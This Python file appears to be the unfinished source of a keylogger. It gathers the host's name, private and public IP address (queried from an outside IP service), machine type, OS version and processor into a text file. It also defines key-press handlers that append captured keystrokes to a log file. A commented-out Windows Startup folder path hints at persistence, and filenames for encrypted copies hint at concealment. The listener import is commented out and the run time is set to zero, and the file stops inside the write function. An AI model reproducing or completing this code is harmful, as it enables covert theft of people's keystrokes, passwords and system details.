# Libraries
import socket
import platform
#from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
import multiprocessing



loggedKeys = "loggedKeys.txt"
systemInfo = "systemInfo.txt"

loggedKeysEncrypted = "loggedKeysEncrypted.txt"
systemInfoEncrypted = "systemInfoEncrypted.txt"

path = "" #"C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
extend = "\\"
extendedPath = path + extend


def getSystemInfo():
    with open(extendedPath + systemInfo, "a") as f:
        hostname = socket.gethostname()
        # Writes hostname
        f.write("Hostname: " + hostname + '\n')

        privateIP = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP address: " + publicIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve public IP address" + '\n')

        # Writes Private IP
        f.write("private IP address: " + privateIP + '\n')
        # Writes Machine Name
        f.write("Machine: " + platform.machine() + '\n')
        # Writes System Type
        f.write("System: "+ platform.system() + '\n')
        # Writes System Version
        f.write("Version: "+ platform.version() +'\n')
        # Writes Processor
        f.write("Processor: " + platform.processor() + '\n')

getSystemInfo()

### Establishing Time the Keylogger is Running ###
logTime = 0 #This should be changed to 24 hours equivalent
startTime = time.time()
endTime = time.time() + logTime

while startTime < endTime:
    count = 0
    keys = []


    def onPress(key):
        global keys
        global count
        global startTime

        print(key)
        keys.append(key)
        count += 1
        startTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []

    def writeToFile(keys):
        with open(extendedPath + loggedKeys, "a") as f:
            for key in keys:
                k = str(key.replace("'",""))
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()